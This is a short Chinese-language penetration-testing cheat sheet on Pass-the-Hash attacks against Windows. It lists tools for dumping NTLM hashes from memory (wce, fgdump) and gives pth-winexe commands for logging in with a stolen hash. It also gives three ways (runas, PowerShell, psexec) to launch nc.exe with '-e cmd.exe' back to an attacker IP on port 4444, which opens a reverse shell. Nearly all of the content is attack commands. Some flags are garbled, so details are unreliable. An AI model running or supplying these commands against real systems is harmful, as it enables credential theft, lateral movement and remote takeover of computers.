
「Pass The Hash」允许攻击者使用用户名和NTLM/LM哈希的有效组合（而不是明文密码）对远程目标进行身份验证，从而无需知道明文密码（针对 Hash 字符串难以破解的场景）
Windows Hash 格式：
```
user:group:id:ntlmpassword::
```
你可以尝试使用下列工具从内存中提取 hash:
```
wce32.exe -w
wce64.exe -w
fgdump.exe
```
在目标计算机上上传并运行fgdump.exe：
```
 $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80
$ pth-winexe -U DOMAIN/user%hash //$ip cmd
```
或者:
```
export SMBHASH=xxx
$ pth-winexe -U user%  //$ip cmd
```
你还可以使用下面这些方法：

- 方法一:
```shell
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
- 方法二:
```shell
$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$ computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
$ powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1
```
- 方法三:
```shell
$ psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc <attacker_ip> 4444 -e cmd.exe"
```
